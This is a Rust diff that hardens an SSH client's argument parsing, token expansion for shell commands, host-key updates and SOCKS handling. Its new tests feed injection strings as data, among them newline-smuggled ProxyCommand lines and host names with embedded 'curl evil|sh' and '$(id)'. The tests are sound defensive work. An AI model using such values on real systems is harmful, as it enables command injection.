@@ -358,15 +358,15 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                         .clone()
                 };
                 match c {
-                    'b' => extra_o.push(format!("BindAddress {v}")),
-                    'c' => extra_o.push(format!("Ciphers {v}")),
+                    'b' => set_o(&mut extra_o, format!("BindAddress {v}")),
+                    'c' => set_o(&mut extra_o, format!("Ciphers {v}")),
                     'e' => escape_char = Some(parse_escape_char(&v)?),
                     'i' => identities.push(v),
                     // The first user named (-l, -o User, user@host) wins.
                     'l' => {
                         first_user.get_or_insert(v);
                     }
-                    'm' => extra_o.push(format!("MACs {v}")),
+                    'm' => set_o(&mut extra_o, format!("MACs {v}")),
                     'o' => apply_dash_o(
                         &{
                             let kv = v.trim_start();
@@ -395,18 +395,32 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                         &mut request_tty,
                         &mut extra_o,
                     )?,
-                    'p' => port = Some(v.parse::<u16>().map_err(|_| "invalid port".to_string())?),
-                    'B' => extra_o.push(format!("BindInterface {v}")),
+                    // The first port given (-p, -o Port) wins.
+                    'p' => {
+                        let p = v.parse::<u16>().map_err(|_| "invalid port".to_string())?;
+                        if port.is_none() && !has_o(&extra_o, "Port") {
+                            port = Some(p);
+                        }
+                    }
+                    'B' => set_o(&mut extra_o, format!("BindInterface {v}")),
                     'D' => {
                         dynamics_raw.push(parse_dynamic_forward(&v)?);
                         forward_specs.push((b'D', v));
                     }
                     'E' => log_file = Some(v),
                     'F' => config_file = Some(PathBuf::from(v)),
-                    'I' => extra_o.push(format!("PKCS11Provider {v}")),
+                    'I' => set_o(&mut extra_o, format!("PKCS11Provider {v}")),
                     // Also a first-obtained `ProxyJump` (so it excludes a
                     // configured ProxyCommand, as OpenSSH's).
                     'J' => {
+                        if has_o(&extra_o, "ProxyJump") {
+                            return Err("Only a single -J option is permitted (use commas \
+                                        to separate multiple jump hops)"
+                                .into());
+                        }
+                        if has_o(&extra_o, "ProxyCommand") {
+                            return Err("Cannot specify -J with ProxyCommand".into());
+                        }
                         extra_o.push(format!("ProxyJump {v}"));
                         proxy_jump = Some(v);
                     }
@@ -433,7 +447,7 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                         remotes.push(parse_remote_forward(&v)?);
                         forward_specs.push((b'R', v));
                     }
-                    'S' => extra_o.push(format!("ControlPath {v}")),
+                    'S' => set_o(&mut extra_o, format!("ControlPath {v}")),
                     'w' => {
                         // As OpenSSH: enables tunnelling (point-to-point
                         // unless set already) with these devices.
@@ -442,7 +456,7 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                             std::process::exit(255);
                         }
                         extra_o.push("Tunnel yes".to_string());
-                        extra_o.push(format!("TunnelDevice {v}"));
+                        set_o(&mut extra_o, format!("TunnelDevice {v}"));
                     }
                     'W' => stdio_forward = Some(v),
                     _ => unreachable!(),
@@ -457,11 +471,11 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                 '1' => return Err("SSH protocol v.1 is no longer supported".into()),
                 '2' | 'k' => {}
                 'y' => use_syslog = true,
-                '4' => extra_o.push("AddressFamily inet".into()),
-                '6' => extra_o.push("AddressFamily inet6".into()),
+                '4' => set_o(&mut extra_o, "AddressFamily inet".into()),
+                '6' => set_o(&mut extra_o, "AddressFamily inet6".into()),
                 'a' => {
                     agent_forward = false;
-                    extra_o.push("ForwardAgent no".into());
+                    set_o(&mut extra_o, "ForwardAgent no".into());
                 }
                 'A' => agent_forward = true,
                 'C' => compression = Some(true),
@@ -469,14 +483,14 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                     fork_after_auth = true;
                     stdin_null = true;
                 }
-                'g' => extra_o.push("GatewayPorts yes".into()),
+                'g' => set_o(&mut extra_o, "GatewayPorts yes".into()),
                 'G' => print_config = true,
                 'Z' => dump_pubkeys = true,
                 // GSSAPI authentication / credential delegation: not
                 // implemented, so (as with GSSAPIAuthentication) nothing to
                 // turn on; OpenSSH without a Kerberos ticket behaves alike.
                 'K' => {}
-                'M' => extra_o.push("ControlMaster yes".into()),
+                'M' => set_o(&mut extra_o, "ControlMaster yes".into()),
                 'n' => stdin_null = true,
                 'N' => no_command = true,
                 'q' => quiet = true,
@@ -488,7 +502,7 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
                 'V' => version = true,
                 'x' => {
                     x11_forward = None;
-                    extra_o.push("ForwardX11 no".into());
+                    set_o(&mut extra_o, "ForwardX11 no".into());
                 }
                 'X' => x11_forward = Some(X11Forward::Untrusted),
                 'Y' => x11_forward = Some(X11Forward::Trusted),
@@ -501,6 +515,10 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
     if first_user.is_some() {
         cli_user = first_user;
     }
+    // Whatever option queued them (`-o`, but also `-S path`, `-b addr`,
+    // `-c list`, …), the lines are read as one configuration: none may
+    // carry a second one.
+    check_o_lines(&extra_o)?;
     // `-t` asks for a terminal when stdin is one; `-tt` always.
     match tty_count {
         0 => {}
@@ -613,6 +631,45 @@ fn parse_args(args: &[String]) -> Result<Cli, String> {
     })
 }
 
+/// Refuse a queued option line holding a line break (or a NUL): the lines
+/// are joined with `\n` into a synthetic configuration, where a value with
+/// one of its own would smuggle in further directives (`ssh -S "$path"`
+/// with `\nProxyCommand …` in the path).
+fn check_o_lines(extra_o: &[String]) -> Result<(), String> {
+    match extra_o.iter().find(|l| l.contains(['\n', '\r', '\0'])) {
+        Some(l) => Err(format!(
+            "option value must not contain a newline, carriage return or NUL: {l:?}"
+        )),
+        None => Ok(()),
+    }
+}
+
+/// The keyword of a line queued in `extra_o` (`Keyword value`).
+fn o_keyword(line: &str) -> &str {
+    line.split([' ', '\t', '=']).next().unwrap_or("")
+}
+
+/// Whether an option given so far queued a line for `keyword`.
+fn has_o(extra_o: &[String], keyword: &str) -> bool {
+    extra_o
+        .iter()
+        .any(|l| o_keyword(l).eq_ignore_ascii_case(keyword))
+}
+
+/// Queue `line` for a flag that, as in OpenSSH, sets its option whatever
+/// was given before it (`-a`, `-4`, `-S path`, …).
+///
+/// The queued lines are read first-value-wins, like the options of a
+/// configuration block: that is right between `-o` options, and for an
+/// `-o` after a flag, but a flag overrides what precedes it — `ssh -o
+/// ForwardAgent=yes -a` must not forward the agent — so the earlier lines
+/// for its keyword are dropped.
+fn set_o(extra_o: &mut Vec<String>, line: String) {
+    let keyword = o_keyword(&line).to_string();
+    extra_o.retain(|l| !o_keyword(l).eq_ignore_ascii_case(&keyword));
+    extra_o.push(line);
+}
+
 /// One `-o KEY=VALUE` (or `-o "KEY VALUE"`): the handful of keywords with a
 /// dedicated `Cli` field are set directly; every other keyword is queued in
 /// `extra_o` for the real config parser.
@@ -696,7 +753,10 @@ fn apply_dash_o(
 /// each honours the real strict parser (rejecting unknown keywords and bad
 /// values exactly as the file would), then overlay every field the synthetic
 /// block actually set on top of `cfg_block` — giving `-o` the highest
-/// precedence, matching OpenSSH.
+/// precedence, matching OpenSSH. Within the block the first value given
+/// for an option is the one kept, as OpenSSH reads the command line: a
+/// wrapper's `-o ForwardAgent=no` is not undone by a later
+/// `-o ForwardAgent=yes`.
 fn apply_extra_o(
     cfg_block: &mut puressh::config::ClientOptions,
     extra_o: &[String],
@@ -704,6 +764,7 @@ fn apply_extra_o(
     if extra_o.is_empty() {
         return Ok(());
     }
+    check_o_lines(extra_o)?;
     let src = extra_o.join("\n");
     let parsed = puressh::config::SshClientConfig::parse(&src).map_err(|e| format!("-o: {e}"))?;
     // `-o` options are obtained before the files: theirs win, and their
@@ -1511,6 +1572,11 @@ fn install_host_key_checks(
         .unwrap_or(VerifyHostKeyDns::No);
     let host = connect_host.to_string();
     kh.pre_check = Some(Arc::new(move |key_type: &str, blob: &[u8]| {
+        // The SSHFP verdict shown in the first-contact question is this
+        // host's: forget the previous host's (a ProxyJump hop's "Matching
+        // host key fingerprint found in DNS." is not about the next host,
+        // which may not use VerifyHostKeyDNS at all).
+        common::set_dns_match(None);
         // This library refuses RSA keys under 2048 bits whatever the floor.
         if key_type == "ssh-rsa"
             && min_rsa > 2048
@@ -1628,8 +1694,10 @@ fn connect_jump_chain(
             // Subsequent hop: tunnel a direct-tcpip channel through the
             // previous hop and run the client over it.
             Some((prev, prev_no_more_sessions)) => {
+                // As `ssh -W` would: the carrier of the next hop's own
+                // encrypted session, not a port forward.
                 let ch = prev
-                    .open_direct_tcpip(connect_host.as_str(), port, "127.0.0.1", 0)
+                    .open_stdio_forward(connect_host.as_str(), port)
                     .map_err(|e| format!("proxyjump hop {}: open channel: {e}", idx + 1))?;
                 if *prev_no_more_sessions {
                     send_no_more_sessions(prev);
@@ -1900,6 +1968,12 @@ fn final_config_pass(
         return Ok(());
     }
     if canonical {
+        // The name now comes from the configuration's domains and the DNS
+        // (a CNAME target), not the command line: it becomes `%h`, so it is
+        // held to the same rule as the name typed.
+        if !valid_hostname(&host) {
+            return Err("canonicalized hostname contains invalid characters".into());
+        }
         // The canonical name is the connection target from now on.
         cfg_block.host_name = Some(host.clone());
     }
@@ -2239,7 +2313,7 @@ fn print_config(
         "ciphers {}",
         list(&c.ciphers, puressh::config::AlgoCategory::Cipher)
     ));
-    if let Some(p) = &c.control_path {
+    if let Some(p) = c.control_path_enabled() {
         out.push(format!("controlpath {p}"));
     }
     out.push(format!(
@@ -3307,7 +3381,7 @@ fn run() -> Result<i32, String> {
             &format!("proxyjump: opening channel to target {connect_host}:{port}"),
         );
         let ch = last
-            .open_direct_tcpip(connect_host.as_str(), port, "127.0.0.1", 0)
+            .open_stdio_forward(connect_host.as_str(), port)
             .map_err(|e| format!("proxyjump: open channel to target: {e}"))?;
         if last_no_more_sessions {
             send_no_more_sessions(&last);
@@ -3373,15 +3447,17 @@ fn run() -> Result<i32, String> {
         // over the configured socket via connect_via (which still threads
         // connect_host through so KnownHosts looks the host up by name).
         //
-        // Unless `KnockMode no`, a refused or slow connect falls back to the
-        // puressh UDP knock (docs/knock.md), which needs the publickey
-        // identities up front to sign the knock.
+        // With `KnockMode auto` or `always`, a refused or slow connect
+        // falls back to the puressh UDP knock (docs/knock.md), which needs
+        // the publickey identities up front to sign the knock. Off unless
+        // configured: a knock sends the user name, key fingerprint and sig1
+        // in the clear, and a refused or slow connect is anyone's to cause.
         vlog(1, &format!("connecting to {connect_host}:{port}"));
         #[cfg_attr(not(feature = "knock"), allow(unused_mut))]
         let mut cfg = cfg;
         let knock_mode = cfg_block
             .knock_mode
-            .unwrap_or(puressh::config::KnockSetting::Auto);
+            .unwrap_or(puressh::config::KnockSetting::No);
         // Without the `knock` feature the keywords parse but do nothing.
         let use_knock = cfg!(feature = "knock") && knock_mode != puressh::config::KnockSetting::No;
         let sock = if !use_knock {
@@ -3480,7 +3556,14 @@ fn run() -> Result<i32, String> {
     if let Some(u) = &hostkeys_updater {
         let u = u.clone();
         let negotiated = client.negotiated().map(|n| n.host_key);
-        u.state.lock().map(|mut g| g.host_key_alg = negotiated).ok();
+        let session_host_key = client.session_binding().map(|b| b.host_key);
+        u.state
+            .lock()
+            .map(|mut g| {
+                g.host_key_alg = negotiated;
+                g.session_host_key = session_host_key;
+            })
+            .ok();
         client.set_global_request_hook(move |name, raw| {
             if name == "hostkeys-00@openssh.com" {
                 u.received(raw.to_vec());
@@ -3729,9 +3812,10 @@ fn run() -> Result<i32, String> {
             .as_deref()
             .filter(|c| !c.is_empty() && !c.eq_ignore_ascii_case("none"))
     {
-        run_local_command(
-            &tokens.expand(&cmd.replace("%T", tun_ifname.as_deref().unwrap_or("NONE"))),
-        );
+        match tokens.expand_for_shell(&cmd.replace("%T", tun_ifname.as_deref().unwrap_or("NONE"))) {
+            Ok(cmd) => run_local_command(&cmd),
+            Err(e) => warn!("LocalCommand not run: {e}"),
+        }
     }
 
     // `-N`: no session; keep the connection (and its forwards) alive.
@@ -3841,6 +3925,9 @@ struct HostKeysUpdateState {
     offered: Option<Vec<u8>>,
     shared: Option<puressh::shared::SharedClient>,
     host_key_alg: Option<String>,
+    /// The host key this session verified: it must be among the offered
+    /// keys, and no update is made when it is a certificate.
+    session_host_key: Option<Vec<u8>>,
     started: bool,
     finished: bool,
 }
@@ -3938,8 +4025,14 @@ impl HostKeysUpdater {
         g.started = true;
         let me = self.clone();
         let host_key_alg = g.host_key_alg.clone();
+        let session_host_key = g.session_host_key.clone();
         thread::spawn(move || {
-            me.update(&shared, &raw, host_key_alg.as_deref());
+            me.update(
+                &shared,
+                &raw,
+                host_key_alg.as_deref(),
+                session_host_key.as_deref(),
+            );
             if let Ok(mut g) = me.state.lock() {
                 g.finished = true;
             }
@@ -3978,6 +4071,7 @@ impl HostKeysUpdater {
         shared: &puressh::shared::SharedClient,
         raw: &[u8],
         host_key_alg: Option<&str>,
+        session_host_key: Option<&[u8]>,
     ) {
         if !self.trusted() {
             vlog(
@@ -3990,13 +4084,12 @@ impl HostKeysUpdater {
         let mut offered: Vec<Vec<u8>> = Vec::new();
         let mut rest = raw;
         while rest.len() >= 4 {
-            let n = u32::from_be_bytes([rest[0], rest[1], rest[2], rest[3]]) as usize;
-            if rest.len() < 4 + n {
+            let Some((blob, after)) = split_ssh_string(rest) else {
                 vlog(1, "UpdateHostKeys: malformed hostkeys message");
                 return;
-            }
-            let blob = rest[4..4 + n].to_vec();
-            rest = &rest[4 + n..];
+            };
+            let blob = blob.to_vec();
+            rest = after;
             let Some(t) = key_blob_type(&blob) else {
                 continue;
             };
@@ -4013,6 +4106,24 @@ impl HostKeysUpdater {
             offered.push(blob);
         }
         if offered.is_empty() {
+            return;
+        }
+        // As OpenSSH: a session authenticated by a certificate makes no
+        // update (the CA, not the key list, is the trust anchor), and the
+        // key this connection verified must be among the offered ones, or
+        // the server could have the very key the user trusts replaced.
+        let Some(session_key) = session_host_key else {
+            return;
+        };
+        if key_blob_type(session_key).is_some_and(|t| puressh::cert::is_cert_name(&t)) {
+            vlog(
+                1,
+                "UpdateHostKeys: the host key is a certificate; skipping known_hosts update",
+            );
+            return;
+        }
+        if !offered.iter().any(|k| k == session_key) {
+            warn!("server sent hostkeys but did not include the one used in this connection");
             return;
         }
         let mut kh = match std::fs::read(&self.file) {
@@ -4051,15 +4162,10 @@ impl HostKeysUpdater {
             let mut sigs = &reply[..];
             for &i in &plan.new {
                 let key = &offered[i];
-                if sigs.len() < 4 {
+                let Some((sig, after)) = split_ssh_string(sigs) else {
                     return;
-                }
-                let n = u32::from_be_bytes([sigs[0], sigs[1], sigs[2], sigs[3]]) as usize;
-                if sigs.len() < 4 + n {
-                    return;
-                }
-                let sig = &sigs[4..4 + n];
-                sigs = &sigs[4 + n..];
+                };
+                sigs = after;
                 let Some(key_type) = key_blob_type(key) else {
                     return;
                 };
@@ -4126,9 +4232,18 @@ impl HostKeysUpdater {
 
 /// The algorithm name a key or signature blob starts with.
 fn key_blob_type(blob: &[u8]) -> Option<String> {
-    let n = u32::from_be_bytes(blob.get(..4)?.try_into().ok()?) as usize;
-    let name = blob.get(4..4 + n)?;
+    let (name, _) = split_ssh_string(blob)?;
     core::str::from_utf8(name).ok().map(str::to_string)
+}
+
+/// The SSH `string` at the start of `buf` and what follows it; `None` when
+/// the length it declares runs past the buffer. The length is the peer's:
+/// it is compared with what is left, never added to an offset (`4 + n`
+/// wraps where `usize` is 32 bits).
+fn split_ssh_string(buf: &[u8]) -> Option<(&[u8], &[u8])> {
+    let (len, rest) = buf.split_first_chunk::<4>()?;
+    let n = usize::try_from(u32::from_be_bytes(*len)).ok()?;
+    (n <= rest.len()).then(|| rest.split_at(n))
 }
 
 /// Run a `LocalCommand` with the user's shell (`$SHELL`, else `/bin/sh`;
@@ -4405,13 +4520,8 @@ fn spawn_keepalive(
                 Ok(_) => {}
                 Err(_) => return,
             }
-            if unanswered >= count_max {
-                eprintln!("Timeout, server {host} not responding.");
-                std::process::exit(255);
-            }
-            if s.send_keepalive().is_err() {
-                eprintln!("Timeout, server {host} not responding.");
-                std::process::exit(255);
+            if unanswered >= count_max || s.send_keepalive().is_err() {
+                exit_server_not_responding(&host);
             }
             unanswered += 1;
         }
@@ -4478,7 +4588,8 @@ impl RemoteRoutes {
                     Some(dest) => serve_remote_dest(stream, dest, me.permit.clone()),
                     None => warn!(
                         "Warning: forwarded connection for unknown listener {}:{}; dropping",
-                        origin.bound_address, origin.bound_port
+                        sanitize_terminal_str(&origin.bound_address),
+                        origin.bound_port
                     ),
                 }
             });
@@ -4494,7 +4605,7 @@ impl RemoteRoutes {
                     Some(dest) => serve_remote_dest(stream, dest, me.permit.clone()),
                     None => warn!(
                         "Warning: forwarded connection for unknown listener {}; dropping",
-                        origin.socket_path
+                        sanitize_terminal_str(&origin.socket_path)
                     ),
                 }
             },
@@ -4696,7 +4807,10 @@ fn remote_open_permitted(permit: Option<&[String]>, host: &str, port: u16) -> bo
 /// the destination from here, reply, then splice the two.
 fn socks_to_local(mut stream: ChannelStream, permit: Option<&[String]>) {
     use puressh::forwarding::socks;
-    let target = match socks::handshake(&mut stream) {
+    stream.set_read_deadline(Some(std::time::Instant::now() + SOCKS_HANDSHAKE_TIMEOUT));
+    let handshake = socks::handshake(&mut stream);
+    stream.set_read_deadline(None);
+    let target = match handshake {
         Ok(t) => t,
         Err(e) => {
             vlog(1, &format!("-R SOCKS handshake: {e}"));
@@ -4706,7 +4820,8 @@ fn socks_to_local(mut stream: ChannelStream, permit: Option<&[String]>) {
     if !remote_open_permitted(permit, &target.host, target.port) {
         warn!(
             "Rejected connection to {} port {}: not permitted by PermitRemoteOpen",
-            target.host, target.port
+            sanitize_terminal_str(&target.host),
+            target.port
         );
         let _ = socks::write_reply(&mut stream, target.version, false);
         return;
@@ -4726,7 +4841,8 @@ fn socks_to_local(mut stream: ChannelStream, permit: Option<&[String]>) {
         Err(e) => {
             warn!(
                 "connect to {} port {} failed: {e}",
-                target.host, target.port
+                sanitize_terminal_str(&target.host),
+                target.port
             );
             let _ = socks::write_reply(&mut stream, target.version, false);
         }
@@ -5198,6 +5314,54 @@ impl Tokens {
         out
     }
 
+    /// [`Self::expand`] for a string a shell will run (`Match exec`,
+    /// `LocalCommand`): the tokens whose values can come from outside the
+    /// configuration — the DNS, the command line — are refused unless they
+    /// are plain names, so none can add shell syntax of its own. Only the
+    /// tokens `s` actually uses are checked.
+    fn expand_for_shell(&self, s: &str) -> Result<String, String> {
+        let mut used = [false; 5];
+        let mut chars = s.chars();
+        while let Some(c) = chars.next() {
+            if c == '%' {
+                match chars.next() {
+                    Some('h') => used[0] = true,
+                    Some('n') => used[1] = true,
+                    Some('k') => used[2] = true,
+                    Some('r') => used[3] = true,
+                    Some('j') => used[4] = true,
+                    _ => {}
+                }
+            }
+        }
+        let host_like = [
+            ('h', &self.host, "hostname"),
+            ('n', &self.original, "hostname"),
+            ('k', &self.key_alias, "host key alias"),
+        ];
+        for (i, (token, value, what)) in host_like.into_iter().enumerate() {
+            if used[i] && !valid_hostname(value) {
+                return Err(format!("%{token}: {what} contains invalid characters"));
+            }
+        }
+        if used[3] && !valid_ruser(&self.remote_user) {
+            return Err("%r: remote username contains invalid characters".into());
+        }
+        // `[user@]host[:port]` hops, comma-separated.
+        if used[4]
+            && !self.jump.split(',').all(|hop| {
+                let (user, host) = match hop.rsplit_once('@') {
+                    Some((u, h)) => (Some(u), h),
+                    None => (None, hop),
+                };
+                valid_hostname(host) && user.is_none_or(valid_ruser)
+            })
+        {
+            return Err("%j: jump host contains invalid characters".into());
+        }
+        Ok(self.expand(s))
+    }
+
     /// A file name as OpenSSH takes it: `~`, then `${VAR}`, then tokens.
     /// (`~` alone is the home directory with a `/`, as tilde_expand_filename.)
     fn expand_path(&self, s: &str) -> String {
@@ -5293,7 +5457,16 @@ fn match_exec(
         .unwrap_or_default();
     let mut tokens = Tokens::new(&cli.host, &host, port, &ruser, opts, cli);
     tokens.key_alias = opts.host_key_alias.clone().unwrap_or_else(|| host.clone());
-    let cmd = tokens.expand(cmd);
+    // A name from the DNS (CanonicalizeHostname) must not reach the shell
+    // with syntax of its own. Refusing beats treating the criterion as
+    // unmatched, which would silently skip the block's settings.
+    let cmd = match tokens.expand_for_shell(cmd) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("Match exec '{}': {e}", sanitize_terminal_str(cmd));
+            std::process::exit(255);
+        }
+    };
     #[cfg(unix)]
     let (shell, flag) = (
         std::env::var("SHELL")
@@ -5468,7 +5641,7 @@ fn resolve_mux(
     user: &str,
 ) -> Result<Option<MuxDecision>, String> {
     use puressh::config::{ControlMaster, ControlPersist};
-    let Some(template) = cfg_block.control_path.as_deref() else {
+    let Some(template) = cfg_block.control_path_enabled() else {
         return Ok(None);
     };
     let master = cfg_block.control_master.unwrap_or(ControlMaster::No);
@@ -5759,15 +5932,16 @@ fn run_mux_forwarding(
                     Ok(s) => s,
                     Err(e) => {
                         eprintln!("ssh: -D accept on :{listen_port}: {e}");
+                        thread::sleep(ACCEPT_RETRY_DELAY);
                         continue;
                     }
                 };
                 let mux_path = mux_path.clone();
                 thread::spawn(move || {
-                    let target = match socks::handshake(&mut tcp) {
+                    let target = match socks_handshake_tcp(&mut tcp) {
                         Ok(t) => t,
                         Err(e) => {
-                            eprintln!("ssh: -D handshake: {e}");
+                            report_socks_handshake_error(&e);
                             return;
                         }
                     };
@@ -5790,8 +5964,11 @@ fn run_mux_forwarding(
                         }
                         Err(e) => {
                             eprintln!(
-                                "ssh: -D direct-tcpip {}:{} over mux: {e}",
-                                target.host, target.port
+                                "{}",
+                                sanitize_terminal_str(&format!(
+                                    "ssh: -D direct-tcpip {}:{} over mux: {e}",
+                                    target.host, target.port
+                                ))
                             );
                             let _ = socks::write_reply(&mut tcp, target.version, false);
                         }
@@ -6596,6 +6773,21 @@ impl EscapeFilter {
 /// an escape sequence (set while a raw-mode session runs).
 #[cfg(unix)]
 static ORIGINAL_TERMIOS: std::sync::Mutex<Option<libc::termios>> = std::sync::Mutex::new(None);
+
+/// End the client on a `ServerAliveCountMax` timeout the way every other
+/// exit does: the terminal taken out of raw mode first, then status 255.
+fn exit_server_not_responding(host: &str) -> ! {
+    eprintln!("Timeout, server {host} not responding.");
+    #[cfg(unix)]
+    if let Ok(g) = ORIGINAL_TERMIOS.lock()
+        && let Some(t) = g.as_ref()
+    {
+        // SAFETY: restoring a termios captured from fd 0.
+        unsafe { libc::tcsetattr(0, libc::TCSADRAIN, t) };
+    }
+    common::finish_log();
+    std::process::exit(255);
+}
 
 /// Carry out an escape action on behalf of the stdin thread, for the
 /// session `channel` of `shared`.
@@ -7702,6 +7894,77 @@ fn bind_unix_listener(_path: &str) -> std::io::Result<()> {
     ))
 }
 
+/// How long a client of a `-D` listener has to send its whole SOCKS
+/// request. Without a bound, a connection that says nothing holds its
+/// thread and descriptor for as long as it likes.
+const SOCKS_HANDSHAKE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
+
+/// The pause after a failed `accept` on a forwarding listener: the usual
+/// cause (no descriptors left) does not go away by retrying at once, which
+/// would spin and flood stderr.
+const ACCEPT_RETRY_DELAY: std::time::Duration = std::time::Duration::from_millis(250);
+
+/// A TCP stream whose reads fail once a deadline has passed, however the
+/// peer spaces its bytes (a per-read timeout alone restarts with each one).
+struct DeadlineStream<'a> {
+    tcp: &'a mut TcpStream,
+    until: std::time::Instant,
+}
+
+impl Read for DeadlineStream<'_> {
+    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+        let left = self
+            .until
+            .checked_duration_since(std::time::Instant::now())
+            .filter(|d| !d.is_zero())
+            .ok_or_else(|| std::io::Error::from(ErrorKind::TimedOut))?;
+        self.tcp.set_read_timeout(Some(left))?;
+        self.tcp.read(buf)
+    }
+}
+
+impl Write for DeadlineStream<'_> {
+    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
+        self.tcp.write(buf)
+    }
+    fn flush(&mut self) -> std::io::Result<()> {
+        self.tcp.flush()
+    }
+}
+
+/// [`puressh::forwarding::socks::handshake`] on an accepted connection,
+/// given [`SOCKS_HANDSHAKE_TIMEOUT`] in all; the stream is left without a
+/// read timeout for the splice that follows.
+fn socks_handshake_tcp(
+    tcp: &mut TcpStream,
+) -> Result<puressh::forwarding::socks::SocksTarget, puressh::forwarding::socks::SocksError> {
+    socks_handshake_within(tcp, SOCKS_HANDSHAKE_TIMEOUT)
+}
+
+fn socks_handshake_within(
+    tcp: &mut TcpStream,
+    limit: std::time::Duration,
+) -> Result<puressh::forwarding::socks::SocksTarget, puressh::forwarding::socks::SocksError> {
+    let result = puressh::forwarding::socks::handshake(&mut DeadlineStream {
+        tcp: &mut *tcp,
+        until: std::time::Instant::now() + limit,
+    });
+    tcp.set_read_timeout(None)?;
+    result
+}
+
+/// Report a failed `-D` SOCKS handshake. A client that merely never sent
+/// its request is only worth a debug line.
+fn report_socks_handshake_error(e: &puressh::forwarding::socks::SocksError) {
+    use puressh::forwarding::socks::SocksError;
+    match e {
+        SocksError::Io(io) if matches!(io.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
+            vlog(1, "-D handshake: timed out waiting for the SOCKS request")
+        }
+        _ => eprintln!("ssh: -D handshake: {e}"),
+    }
+}
+
 /// Per-`-D` SOCKS accept loop. Each accepted TCP connection runs the SOCKS
 /// handshake ([`puressh::forwarding::socks::handshake`]) to learn the CONNECT
 /// target, opens a `direct-tcpip` channel to it on the shared connection,
@@ -7724,6 +7987,7 @@ fn spawn_dynamic_forward_listener(
                 Ok(s) => s,
                 Err(e) => {
                     eprintln!("ssh: -D accept on :{listen_port}: {e}");
+                    thread::sleep(ACCEPT_RETRY_DELAY);
                     continue;
                 }
             };
@@ -7731,12 +7995,12 @@ fn spawn_dynamic_forward_listener(
             // One thread per connection: the SOCKS handshake reads from the
             // socket and must not block the accept loop.
             thread::spawn(move || {
-                let target = match socks::handshake(&mut tcp) {
+                let target = match socks_handshake_tcp(&mut tcp) {
                     Ok(t) => t,
                     Err(e) => {
                         // Unsupported/protocol errors already wrote any reply
                         // the protocol allows; just log and drop.
-                        eprintln!("ssh: -D handshake: {e}");
+                        report_socks_handshake_error(&e);
                         return;
                     }
                 };
@@ -7752,7 +8016,15 @@ fn spawn_dynamic_forward_listener(
                         splice_shared_with_tcp(ctx, stream, tcp);
                     }
                     Err(e) => {
-                        eprintln!("ssh: -D direct-tcpip {}:{}: {e}", target.host, target.port);
+                        // The name is the SOCKS client's, the reason may be
+                        // the server's: neither goes to the terminal raw.
+                        eprintln!(
+                            "{}",
+                            sanitize_terminal_str(&format!(
+                                "ssh: -D direct-tcpip {}:{}: {e}",
+                                target.host, target.port
+                            ))
+                        );
                         let _ = socks::write_reply(&mut tcp, target.version, false);
                     }
                 }
@@ -8527,6 +8799,301 @@ mod extra_o_tests {
         assert!(err.contains("newline"), "{err}");
         // Plain values still parse.
         assert!(parse_args(&args(&["-o", "User=x", "host"])).is_ok());
+    }
+
+    /// The short options rewritten into configuration lines are held to
+    /// the same rule as `-o`.
+    #[test]
+    fn short_options_reject_embedded_newline() {
+        for opt in ["-S", "-b", "-c", "-m", "-B", "-I", "-P", "-J"] {
+            for evil in [
+                "x\nProxyCommand touch /tmp/pwned",
+                "x\rProxyCommand y",
+                "x\0y",
+            ] {
+                let err = parse_args(&args(&[opt, evil, "host"])).err();
+                assert!(
+                    err.as_deref().is_some_and(|e| e.contains("newline")),
+                    "{opt} {evil:?}: {err:?}"
+                );
+            }
+            assert!(parse_args(&args(&[opt, "x", "host"])).is_ok(), "{opt}");
+        }
+        assert!(parse_args(&args(&["-o", "ControlPath=x\0y", "host"])).is_err());
+        // The join site refuses them too, whoever queued the line.
+        let mut block = puressh::config::ClientOptions::default();
+        assert!(
+            apply_extra_o(
+                &mut block,
+                &args(&["ControlPath /tmp/x\nProxyCommand evil"])
+            )
+            .is_err()
+        );
+        assert_eq!(block.proxy_command, None);
+    }
+
+    /// `Match exec` / `LocalCommand` go to a shell: a `%h` from the DNS (or
+    /// any other outside value) with shell syntax is refused, not expanded.
+    #[test]
+    fn shell_expansion_refuses_unsafe_token_values() {
+        let cli = parse_args(&args(&["host"])).unwrap();
+        let cfg = puressh::config::ClientOptions::default();
+        let tokens = |host: &str, user: &str| Tokens::new("host", host, 22, user, &cfg, &cli);
+        let ok = tokens("db1.corp.example.com", "alice");
+        assert_eq!(
+            ok.expand_for_shell("test %h = x -a %r = y -a %p -eq 22 # 100%%h")
+                .unwrap(),
+            "test db1.corp.example.com = x -a alice = y -a 22 -eq 22 # 100%h"
+        );
+        for host in [
+            "x`curl evil|sh`.corp.example.com",
+            "a b",
+            "a;b",
+            "$(id)",
+            "a\nb",
+            "-oProxyCommand=x",
+        ] {
+            let t = tokens(host, "alice");
+            assert!(t.expand_for_shell("ping -c1 %h").is_err(), "{host:?}");
+            // Unused, it is not looked at; `%%h` is not a use.
+            assert_eq!(t.expand_for_shell("true %%h %p").unwrap(), "true %h 22");
+            // `%k` defaults to the name as given, which stays fine.
+            assert!(t.expand_for_shell("echo %n %k").is_ok());
+        }
+        let t = tokens("h", "u;id");
+        assert!(t.expand_for_shell("echo %r").is_err());
+        assert!(t.expand_for_shell("echo %h").is_ok());
+        let mut t = tokens("h", "u");
+        t.key_alias = "a|b".into();
+        assert!(t.expand_for_shell("echo %k").is_err());
+        t.jump = "jump1,user@jump2:2222".into();
+        assert!(t.expand_for_shell("echo %j").is_ok());
+        t.jump = "jump1,`id`@jump2".into();
+        assert!(t.expand_for_shell("echo %j").is_err());
+    }
+
+    /// The options of a command line, resolved over an empty configuration.
+    fn resolved(v: &[&str]) -> (Cli, puressh::config::ClientOptions) {
+        let cli = parse_args(&args(v)).unwrap();
+        let mut block = puressh::config::ClientOptions::default();
+        apply_extra_o(&mut block, &cli.extra_o).unwrap();
+        (cli, block)
+    }
+
+    /// The first `-o` given for an option wins: a later one cannot undo
